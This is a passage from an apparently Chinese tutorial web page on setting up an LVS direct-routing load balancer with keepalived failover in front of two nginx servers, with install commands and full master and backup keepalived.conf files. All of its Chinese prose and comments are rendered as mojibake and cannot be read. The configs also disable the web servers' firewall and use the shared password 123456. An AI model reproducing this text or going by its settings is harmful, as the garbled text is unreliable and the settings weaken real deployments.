ipï¼Œå¤–éƒ¨å®¢æˆ·ç«¯è¯·æ±‚çš„éƒ½æ˜¯è¿™ä¸ª ipï¼Œlvs åœ¨æ¥æ”¶åˆ°è™šæ‹Ÿ ip çš„è¯·æ±‚ä¹‹åï¼Œé€šè¿‡é…ç½®çš„è°ƒåº¦å™¨å’Œè´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œé€‰æ‹©ä¸€ä¸ªç›®æ ‡ nginx æœåŠ¡å™¨ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™è¯¥æœåŠ¡å™¨ã€‚è¿™é‡Œ lvs æœ‰ä¸¤ä¸ªæ¦‚å¿µï¼Œå°±æ˜¯è°ƒåº¦å™¨å’Œè´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œæ‰€è°“çš„è°ƒåº¦å™¨æŒ‡çš„æ˜¯ lvs å°†ä¼šä»¥ä½•ç§æ–¹å¼å¤„ç†è¯·æ±‚å’Œå“åº”æ•°æ®ï¼Œå…¶ä¸»è¦æœ‰ä¸‰ç§è°ƒåº¦å™¨ï¼š</p><ul><li>  Virtual Server via Network Address Translation(VS/NAT)ï¼šè¿™ç§æ–¹å¼çš„ä¸»è¦åŸç†æ˜¯ï¼Œç”¨æˆ·å‘é€è¯·æ±‚åˆ°è™šæ‹Ÿ ip ä¸Šåï¼Œlvs ä¼šæ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•é€‰æ‹©ä¸€ä¸ªç›®æ ‡å¤„ç†æœåŠ¡ï¼Œç„¶åå°†è¯·æ±‚æŠ¥æ–‡ä¸­çš„ç›®æ ‡ ip åœ°å€ä¿®æ”¹ä¸ºè®¡ç®—å¾—åˆ°çš„ç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶ä¸”å‘é€ç»™è¯¥æœåŠ¡å™¨ã€‚å¯¹äºå“åº”çš„æŠ¥æ–‡ï¼Œè°ƒåº¦å™¨ä¼šå°†ç›®æ ‡æœåŠ¡å™¨è¿”å›çš„å“åº”æ•°æ®ä¸­çš„æºåœ°å€ä¿®æ”¹ä¸ºè™šæ‹Ÿ ip åœ°å€ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯¹å®¢æˆ·ç«¯è€Œè¨€ï¼Œå…¶å½¢å¼ä¸Šé¢å‘çš„æ˜¯ä¸€å°æœåŠ¡å™¨ã€‚ä¸è¿‡è¿™ç§æ–¹å¼çš„ç¼ºç‚¹åœ¨äºï¼Œæ‰€æœ‰çš„å“åº”æ•°æ®éƒ½éœ€è¦é€šè¿‡è°ƒåº¦å™¨ï¼Œå¦‚æœè¯·æ±‚é‡æ¯”è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆè°ƒåº¦å™¨å°±ä¼šæˆä¸ºæ•´ä¸ªç³»ç»Ÿçš„ç“¶é¢ˆã€‚</li><li>  Virtual Server via IP Tunneling(VS/TUN)ï¼šè¿™ç§æ–¹å¼ä¸»è¦è§£å†³çš„å°±æ˜¯ VS/NAT ä¸­ï¼Œå“åº”æ•°æ®ä¼šç»è¿‡è°ƒåº¦å™¨çš„é—®é¢˜ã€‚åŒ VS/NAT ä¸€æ · ï¼Œè°ƒåº¦å™¨è¿˜æ˜¯ä¼šæ¥æ”¶è¯·æ±‚çš„æ•°æ®ï¼Œå¹¶ä¸”å°†æŠ¥æ–‡ä¸­çš„ç›®æ ‡ ip ä¿®æ”¹ä¸ºç›®æ ‡æœåŠ¡çš„ ipï¼Œä½†æ˜¯åœ¨ç›®æ ‡æœåŠ¡å¤„ç†å®Œæ•°æ®ä¹‹åï¼Œå…¶ä¼šç›´æ¥å°†å“åº”æŠ¥æ–‡ä¸­çš„æº ip ä¿®æ”¹ä¸ºè™šæ‹Ÿ ipï¼Œç„¶åå°†è¯·æ±‚å‘é€ç»™å®¢æˆ·ç«¯ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå“åº”æ•°æ®å°±ç”±å„ä¸ªç›®æ ‡æœåŠ¡è¿›è¡Œäº†å¤„ç†ï¼Œè€Œæ— éœ€é€šè¿‡è°ƒåº¦å™¨è¿›è¡Œè¿”å›ï¼Œè¿™ç§æ–¹å¼ä¼šå¤§å¤§æé«˜ç³»ç»Ÿçš„ååé‡ï¼Œè€Œä¸”ç”±äºä¸€èˆ¬è¯·æ±‚æŠ¥æ–‡æ¯”å“åº”æŠ¥æ–‡å°å¾ˆå¤šï¼Œè°ƒåº¦å™¨ä¹Ÿåªéœ€è¦å¤„ç†è¯·æ±‚æŠ¥æ–‡ï¼Œé‚£ä¹ˆç³»ç»Ÿçš„æ•´ä½“è´Ÿè½½å°†ä¼šè¢«å‡æ‘Šåˆ°å„ä¸ªæœåŠ¡å™¨ä¸Šã€‚</li><li>  Virtual Server via Direct Routing(VS/DR)ï¼šè¿™ç§æ–¹å¼ç›¸å¯¹äº VS/TUNï¼Œå…¶ä¸»è¦åŒºåˆ«åœ¨äºï¼ŒVS/TUN æ˜¯å°†è¯·æ±‚æŠ¥æ–‡ä¸­çš„ ip åœ°å€ä¿®æ”¹ä¸ºç›®æ ‡æœåŠ¡çš„ ip åœ°å€ï¼Œè€Œ VS/DR åˆ™æ˜¯ç›´æ¥å°†è¯·æ±‚æŠ¥æ–‡ä¸­çš„ MAC åœ°å€ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ï¼Œè¿™ç§æ–¹å¼æ•ˆç‡ä¼šæ›´é«˜ï¼Œå› ä¸º VS/TUN ä¸­çš„ ip åœ°å€æœ€ç»ˆè¿˜æ˜¯éœ€è¦è½¬æ¢ä¸º MAC åœ°å€æ¥å‘é€æ•°æ®çš„ã€‚</li></ul><h3 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. VMware;</span><br><span class="line"><span class="attribute">2</span>. <span class="number">4</span>å°CentOs<span class="number">7</span>è™šæ‹Ÿä¸»æœºï¼š<span class="number">172.16.28.130</span>, <span class="number">172.16.28.131</span>, <span class="number">172.16.28.132</span>, <span class="number">172.16.28.133</span></span><br><span class="line"><span class="attribute">3</span>. ç³»ç»ŸæœåŠ¡ï¼šLVS, Keepalived</span><br><span class="line"><span class="attribute">4</span>. WebæœåŠ¡å™¨ï¼šnginx</span><br><span class="line"><span class="attribute">5</span>. é›†ç¾¤æ­å»ºï¼šLVS DRæ¨¡å¼</span><br></pre></td></tr></table></figure><h3 id="è½¯ä»¶å®‰è£…"><a href="#è½¯ä»¶å®‰è£…" class="headerlink" title="è½¯ä»¶å®‰è£…"></a>è½¯ä»¶å®‰è£…</h3><p>åœ¨å››å°è™šæ‹Ÿæœºä¸Šï¼Œæˆ‘ä»¬ä»¥å¦‚ä¸‹æ–¹å¼æ­å»ºé›†ç¾¤ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.16.28.130</span> lvs+keepalived</span><br><span class="line"><span class="number">172.16.28.131</span> lvs+keepalived</span><br><span class="line"><span class="number">172.16.28.132</span> nginx</span><br><span class="line"><span class="number">172.16.28.133</span> nginx</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>172.16.28.130</code>å’Œ<code>172.16.28.131</code>ä¸¤å°æœºå™¨ä½œä¸º<code>lvs+keepalived</code>çš„å·¥ä½œæœºå™¨ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸¤å°æœºå™¨çš„ä½œç”¨ä¸»è¦æ˜¯è¿›è¡Œè´Ÿè½½å‡è¡¡å’Œæ•…éšœæ£€æµ‹å’Œä¸‹çº¿çš„ï¼›æˆ‘ä»¬ä½¿ç”¨<code>172.16.28.132</code>å’Œ<code>172.16.28.133</code>ä¸¤å°æœºå™¨ä½œä¸ºåº”ç”¨æœåŠ¡å™¨ï¼Œä¸»è¦æ˜¯å¯¹å¤–æä¾›æœåŠ¡çš„ã€‚è¿™å››å°æœåŠ¡å™¨ä½œä¸ºæ•´ä¸ªåç«¯é›†ç¾¤æœåŠ¡ï¼Œå¹¶ä¸”å¯¹å¤–æä¾›çš„è™šæ‹Ÿ ip æ˜¯<code>172.16.28.120</code>ã€‚éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œè¿™é‡Œçš„<code>keepalived</code>æ‰€æ£€æµ‹çš„æœåŠ¡æ˜¯ä¸¤å°<code>lvs</code>æœåŠ¡å™¨ï¼Œè¿™ä¸¤å°æœåŠ¡å™¨ï¼Œä¸€å°ä½œä¸º master æœåŠ¡å™¨ï¼Œä¸€å°ä½œä¸º backup æœåŠ¡å™¨ï¼Œä¸¤è€…åœ¨è´Ÿè½½å‡è¡¡çš„é…ç½®ä¸Šæ˜¯å®Œå…¨ä¸€æ ·çš„ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯è¯·æ±‚è™šæ‹Ÿ ip çš„æ—¶å€™ï¼Œ<code>lvs</code>ä¼šå°†è¯¥è¯·æ±‚è½¬å‘åˆ° master æœåŠ¡å™¨ä¸Šï¼Œç„¶å master æœåŠ¡å™¨æ ¹æ®é…ç½®çš„è´Ÿè½½å‡è¡¡ç­–ç•¥é€‰æ‹©ä¸€å°åº”ç”¨æœåŠ¡å™¨ï¼Œå¹¶ä¸”å°†è¯·æ±‚å‘é€ç»™è¯¥åº”ç”¨æœåŠ¡å™¨è¿›è¡Œå¤„ç†ã€‚å¦‚æœåœ¨æŸä¸ªæ—¶åˆ»ï¼Œlvs çš„ master æœåŠ¡å™¨ç”±äºæ•…éšœå®•æœºäº†ï¼Œkeepalived å°±ä¼šæ£€æµ‹åˆ°è¯¥æ•…éšœï¼Œå¹¶ä¸”è¿›è¡Œæ•…éšœä¸‹çº¿ï¼Œç„¶åå°† backup æœºå™¨ä¸Šçº¿ç”¨äºæä¾›æœåŠ¡ï¼Œä»è€Œå®ç°æ•…éšœè½¬ç§»çš„åŠŸèƒ½ã€‚</p><h4 id="lvs-keepalived-å®‰è£…"><a href="#lvs-keepalived-å®‰è£…" class="headerlink" title="lvs+keepalived å®‰è£…"></a>lvs+keepalived å®‰è£…</h4><p>åœ¨<code>172.16.28.130</code>å’Œ<code>172.16.28.131</code>ä¸Šå®‰è£… ipvs å’Œ keepalivedï¼š</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…ipvs</span></span><br><span class="line">sudo yum <span class="keyword">install</span> ipvsadm</span><br></pre></td></tr></table></figure><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…keepalived</span></span><br><span class="line">sudo yum <span class="keyword">install</span> keepalived</span><br></pre></td></tr></table></figure><p>åœ¨<code>172.16.28.132</code>å’Œ<code>172.16.28.133</code>ä¸Šå®‰è£… nginxï¼š</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…nginx</span></span><br><span class="line">sudo yum <span class="keyword">install</span> nginx</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸¤å° nginx æœåŠ¡å™¨ä¸Šéœ€è¦å°†é˜²ç«å¢™å…³é—­ï¼Œå¦åˆ™ lvs+keepalived çš„ä¸¤å°æœºå™¨å°±æ— æ³•å°†è¯·æ±‚å‘é€åˆ°ä¸¤å° nginx æœåŠ¡å™¨ä¸Šæ¥ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…³é—­é˜²ç«å¢™</span></span><br><span class="line">systemctl <span class="builtin-name">disable</span> firewalld.service</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸¤å°è´Ÿè½½å‡è¡¡æœºå™¨æ˜¯å¦æ”¯æŒ lvsï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsmod <span class="string">|grep ip_vs</span></span><br></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœçœ‹åˆ°å¦‚ä¸‹ç»“æœï¼Œåˆ™è¯´æ˜æ˜¯æ”¯æŒçš„</span></span><br><span class="line">[zhangxufeng@localhost ~]$ sudo lsmod|grep ip_vs</span><br><span class="line">ip_vs                <span class="number"> 145497 </span> 0</span><br><span class="line">nf_conntrack         <span class="number"> 137239 </span><span class="number"> 1 </span>ip_vs</span><br><span class="line">libcrc32c             <span class="number"> 12644 </span><span class="number"> 3 </span>xfs,ip_vs,nf_conntrack</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸Šè¿°å‘½ä»¤æ²¡æœ‰ä»»ä½•ç»“æœï¼Œåˆ™æ‰§è¡Œ<code>sudo ipvsadm</code>å‘½ä»¤å¯åŠ¨ ipvs ä¹‹åï¼Œå†é€šè¿‡ä¸Šè¿°å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹å³å¯ã€‚å¯åŠ¨ ipvs ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨<code>/etc/keepalived/</code>ç›®å½•ä¸‹ç¼–è¾‘<code>keepalived.conf</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬ä»¥<code>172.16.28.130</code>æœºå™¨ä½œä¸º master æœºå™¨ï¼Œmaster èŠ‚ç‚¹é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Global Configuration</span></span><br><span class="line"><span class="class">global_defs </span>&#123;</span><br><span class="line">  lvs_id director1  <span class="meta"># æŒ‡å®šlvsçš„id</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># VRRP Configuration</span></span><br><span class="line">vrrp_instance <span class="class">LVS </span>&#123;</span><br><span class="line">  state MASTER<span class="meta"># æŒ‡å®šå½“å‰èŠ‚ç‚¹ä¸ºmasterèŠ‚ç‚¹</span></span><br><span class="line">  interface ens33<span class="meta"># è¿™é‡Œçš„ens33æ˜¯ç½‘å¡çš„åç§°ï¼Œé€šè¿‡ifconfigæˆ–è€…ip addrå¯ä»¥æŸ¥çœ‹</span></span><br><span class="line">  virtual_router_id <span class="number">51</span><span class="meta"># è¿™é‡ŒæŒ‡å®šçš„æ˜¯è™šæ‹Ÿè·¯ç”±idï¼ŒmasterèŠ‚ç‚¹å’ŒbackupèŠ‚ç‚¹éœ€è¦æŒ‡å®šä¸€æ ·çš„</span></span><br><span class="line">  priority <span class="number">151</span><span class="meta"># æŒ‡å®šäº†å½“å‰èŠ‚ç‚¹çš„ä¼˜å…ˆçº§ï¼Œæ•°å€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ï¼ŒmasterèŠ‚ç‚¹è¦é«˜äºbackupèŠ‚ç‚¹</span></span><br><span class="line">  advert_int <span class="number">1</span><span class="meta"># æŒ‡å®šå‘é€VRRPé€šå‘Šçš„é—´éš”ï¼Œå•ä½æ˜¯ç§’</span></span><br><span class="line">  <span class="class">authentication </span>&#123;</span><br><span class="line">    auth_type PASS<span class="meta"># é‰´æƒï¼Œé»˜è®¤é€šè¿‡</span></span><br><span class="line">    auth_pass <span class="number">123456</span><span class="meta"># é‰´æƒè®¿é—®å¯†ç </span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class">virtual_ipaddress </span>&#123;</span><br><span class="line">    <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span><span class="meta"># æŒ‡å®šäº†è™šæ‹Ÿip</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># Virtual Server Configuration - for www server</span></span><br><span class="line"><span class="meta"># åå°çœŸå®ä¸»æœºçš„é…ç½®</span></span><br><span class="line">virtual_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span> <span class="number">80</span> &#123;</span><br><span class="line">  delay_loop <span class="number">1</span><span class="meta"># å¥åº·æ£€æŸ¥çš„æ—¶é—´é—´éš”</span></span><br><span class="line">  lb_algo rr<span class="meta"># è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œè¿™é‡Œæ˜¯è½®è¯¢</span></span><br><span class="line">  lb_kind DR<span class="meta"># è°ƒåº¦å™¨ç±»å‹ï¼Œè¿™é‡Œæ˜¯DR</span></span><br><span class="line">  persistence_time <span class="number">1</span><span class="meta"># æŒ‡å®šäº†æŒç»­å°†è¯·æ±‚æ‰“åˆ°åŒä¸€å°çœŸå®ä¸»æœºçš„æ—¶é—´é•¿åº¦</span></span><br><span class="line">  protocol TCP<span class="meta"># æŒ‡å®šäº†è®¿é—®åå°çœŸå®ä¸»æœºçš„åè®®ç±»å‹</span></span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 1 configuration</span></span><br><span class="line">  <span class="meta"># æŒ‡å®šäº†çœŸå®ä¸»æœº1çš„ipå’Œç«¯å£</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.132</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span><span class="meta"># æŒ‡å®šäº†å½“å‰ä¸»æœºçš„æƒé‡</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span><span class="meta"># æŒ‡å®šäº†è¿›è¡Œå¿ƒè·³æ£€æŸ¥çš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line">      nb_get_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†å¿ƒè·³è¶…æ—¶ä¹‹åçš„é‡å¤æ¬¡æ•°</span></span><br><span class="line">      delay_before_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†åœ¨å°è¯•ä¹‹å‰å»¶è¿Ÿå¤šé•¿æ—¶é—´</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 2 Configuration</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.133</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span><span class="meta"># æŒ‡å®šäº†å½“å‰ä¸»æœºçš„æƒé‡</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span><span class="meta"># æŒ‡å®šäº†è¿›è¡Œå¿ƒè·³æ£€æŸ¥çš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line">      nb_get_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†å¿ƒè·³è¶…æ—¶ä¹‹åçš„é‡å¤æ¬¡æ•°</span></span><br><span class="line">      delay_before_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†åœ¨å°è¯•ä¹‹å‰å»¶è¿Ÿå¤šé•¿æ—¶é—´</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ master èŠ‚ç‚¹ä¸Š keepalived çš„é…ç½®ï¼Œå¯¹äº backup èŠ‚ç‚¹ï¼Œå…¶é…ç½®ä¸ master å‡ ä¹æ˜¯ä¸€è‡´çš„ï¼Œåªæ˜¯å…¶ state å’Œ priority å‚æ•°ä¸åŒã€‚å¦‚ä¸‹æ˜¯ backup èŠ‚ç‚¹çš„å®Œæ•´é…ç½®ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Global Configuration</span></span><br><span class="line"><span class="class">global_defs </span>&#123;</span><br><span class="line">  lvs_id director2  <span class="meta"># æŒ‡å®šlvsçš„id</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># VRRP Configuration</span></span><br><span class="line">vrrp_instance <span class="class">LVS </span>&#123;</span><br><span class="line">  state BACKUP<span class="meta"># æŒ‡å®šå½“å‰èŠ‚ç‚¹ä¸ºmasterèŠ‚ç‚¹</span></span><br><span class="line">  interface ens33<span class="meta"># è¿™é‡Œçš„ens33æ˜¯ç½‘å¡çš„åç§°ï¼Œé€šè¿‡ifconfigæˆ–è€…ip addrå¯ä»¥æŸ¥çœ‹</span></span><br><span class="line">  virtual_router_id <span class="number">51</span><span class="meta"># è¿™é‡ŒæŒ‡å®šçš„æ˜¯è™šæ‹Ÿè·¯ç”±idï¼ŒmasterèŠ‚ç‚¹å’ŒbackupèŠ‚ç‚¹éœ€è¦æŒ‡å®šä¸€æ ·çš„</span></span><br><span class="line">  priority <span class="number">150</span><span class="meta"># æŒ‡å®šäº†å½“å‰èŠ‚ç‚¹çš„ä¼˜å…ˆçº§ï¼Œæ•°å€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ï¼ŒmasterèŠ‚ç‚¹è¦é«˜äºbackupèŠ‚ç‚¹</span></span><br><span class="line">  advert_int <span class="number">1</span><span class="meta"># æŒ‡å®šå‘é€VRRPé€šå‘Šçš„é—´éš”ï¼Œå•ä½æ˜¯ç§’</span></span><br><span class="line">  <span class="class">authentication </span>&#123;</span><br><span class="line">    auth_type PASS<span class="meta"># é‰´æƒï¼Œé»˜è®¤é€šè¿‡</span></span><br><span class="line">    auth_pass <span class="number">123456</span><span class="meta"># é‰´æƒè®¿é—®å¯†ç </span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class">virtual_ipaddress </span>&#123;</span><br><span class="line">    <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span><span class="meta"># æŒ‡å®šäº†è™šæ‹Ÿip</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># Virtual Server Configuration - for www server</span></span><br><span class="line"><span class="meta"># åå°çœŸå®ä¸»æœºçš„é…ç½®</span></span><br><span class="line">virtual_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.120</span> <span class="number">80</span> &#123;</span><br><span class="line">  delay_loop <span class="number">1</span><span class="meta"># å¥åº·æ£€æŸ¥çš„æ—¶é—´é—´éš”</span></span><br><span class="line">  lb_algo rr<span class="meta"># è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œè¿™é‡Œæ˜¯è½®è¯¢</span></span><br><span class="line">  lb_kind DR<span class="meta"># è°ƒåº¦å™¨ç±»å‹ï¼Œè¿™é‡Œæ˜¯DR</span></span><br><span class="line">  persistence_time <span class="number">1</span><span class="meta"># æŒ‡å®šäº†æŒç»­å°†è¯·æ±‚æ‰“åˆ°åŒä¸€å°çœŸå®ä¸»æœºçš„æ—¶é—´é•¿åº¦</span></span><br><span class="line">  protocol TCP<span class="meta"># æŒ‡å®šäº†è®¿é—®åå°çœŸå®ä¸»æœºçš„åè®®ç±»å‹</span></span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 1 configuration</span></span><br><span class="line">  <span class="meta"># æŒ‡å®šäº†çœŸå®ä¸»æœº1çš„ipå’Œç«¯å£</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.132</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span><span class="meta"># æŒ‡å®šäº†å½“å‰ä¸»æœºçš„æƒé‡</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span><span class="meta"># æŒ‡å®šäº†è¿›è¡Œå¿ƒè·³æ£€æŸ¥çš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line">      nb_get_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†å¿ƒè·³è¶…æ—¶ä¹‹åçš„é‡å¤æ¬¡æ•°</span></span><br><span class="line">      delay_before_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†åœ¨å°è¯•ä¹‹å‰å»¶è¿Ÿå¤šé•¿æ—¶é—´</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta"># Real Server 2 Configuration</span></span><br><span class="line">  real_server <span class="number">172.16</span><span class="number">.28</span><span class="number">.133</span> <span class="number">80</span> &#123;</span><br><span class="line">    weight <span class="number">1</span><span class="meta"># æŒ‡å®šäº†å½“å‰ä¸»æœºçš„æƒé‡</span></span><br><span class="line">    <span class="class">TCP_CHECK </span>&#123;</span><br><span class="line">      connection_timeout <span class="number">10</span><span class="meta"># æŒ‡å®šäº†è¿›è¡Œå¿ƒè·³æ£€æŸ¥çš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line">      nb_get_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†å¿ƒè·³è¶…æ—¶ä¹‹åçš„é‡å¤æ¬¡æ•°</span></span><br><span class="line">      delay_before_retry <span class="number">3</span><span class="meta"># æŒ‡å®šäº†åœ¨å°è¯•ä¹‹å‰å»¶è¿Ÿå¤šé•¿æ—¶é—´</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°† master å’Œ backup é…ç½®æˆå®Œå…¨ä¸€æ ·çš„åŸå› æ˜¯ï¼Œåœ¨ master å®•æœºæ—¶ï¼Œå¯ä»¥æ ¹æ® backup çš„é…ç½®è¿›è¡ŒæœåŠ¡çš„æ— ç¼åˆ‡æ¢ã€‚</p><p>åœ¨ lvs+keepalived æœºå™¨é…ç½®å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ä¸‹é¢é…ç½®ä¸¤å°åº”ç”¨æœåŠ¡å™¨çš„ nginx é…ç½®ã€‚è¿™é‡Œæˆ‘ä»¬æ˜¯å°† nginx ä½œä¸ºåº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨å…¶é…ç½®æ–‡ä»¶ä¸­é…ç½®è¿”å›çŠ¶æ€ç ä¸º 200ï¼Œå¹¶ä¸”ä¼šå°†å½“å‰ä¸»æœºçš„ ip è¿”å›ï¼Œå¦‚ä¸‹æ˜¯å…¶é…ç½®ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span> 